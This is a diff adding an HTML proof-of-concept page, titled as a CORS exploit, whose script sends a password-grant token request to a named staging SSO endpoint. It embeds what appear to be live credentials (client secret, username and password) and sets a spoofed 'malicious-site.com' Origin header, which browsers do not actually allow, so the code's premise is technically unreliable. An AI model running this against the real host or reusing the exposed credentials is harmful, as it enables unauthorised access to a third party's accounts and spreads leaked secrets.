@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>Vulnerable API Data</h1>
+    <div id="result">Loading...</div>
+
+    <script>
+        fetch('https://stagingssoapi.9ostech.com/connect/token', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://malicious-site.com'  // Pretend the request is coming from a different site
+            },
+            body: 'grant_type=password&scope=EnwageScope%20offline_access&client_id=SSOClient&client_secret=ssosecret&username=shahzad%409ostech.com&password=-aa%2B%2B8!VwFq9zt9'
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('result').innerText = JSON.stringify(data);
+        })
+        .catch(error => {
+            document.getElementById('result').innerText = 'Error: ' + error;
+        });
+    </script>
+</body>
+</html>
